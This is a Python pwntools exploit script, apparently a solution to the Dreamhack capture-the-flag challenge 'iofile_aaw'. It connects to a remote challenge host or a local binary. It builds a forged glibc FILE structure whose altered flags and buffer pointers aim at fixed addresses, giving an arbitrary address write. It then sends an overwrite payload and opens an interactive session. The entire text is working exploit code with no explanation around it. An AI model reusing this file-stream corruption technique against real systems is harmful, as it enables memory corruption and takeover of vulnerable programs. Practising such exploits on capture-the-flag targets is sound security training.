#!/usr/bin/env python3

from pwn import *

exe = ELF("./iofile_aaw_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-2.27.so")

context.binary = exe
context.log_level = "debug"
context.terminal = ['kgx', '--', 'bash', '-c']

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main", env={'SHELL': '/bin/bash'})
        # r = gdb.debug ([exe.path], "b *__libc_start_main+214", env={'SHELL': '/bin/bash'})
    else:
        r = remote("host3.dreamhack.games", 9891)

    return r


def main():
    p = conn()  
    target1 = 0x6010A0
    target2 = 0x6014A0
    flags = 0xfbad2488 & ~4
    payload = flat(
        {
            0x00: flags,
            0x08: 0,
            0x10: 0,
            0x18: 0,
            0x20: 0,
            0x28: 0,
            0x30: 0,
            0x38: target1 + 9,
            0x40: target2 + 8,
            0x48: 0,
            0x50: 0,
            0x58:0,
            0x60:0,
            0x68:0,
            0x70: 0
        }
    )

    p.sendafter (b'Data: ', payload)
    p.send (b'A' * (1023 - 8) + p64 (0xdeadbeef))

    p.interactive()


if __name__ == "__main__":
    main()
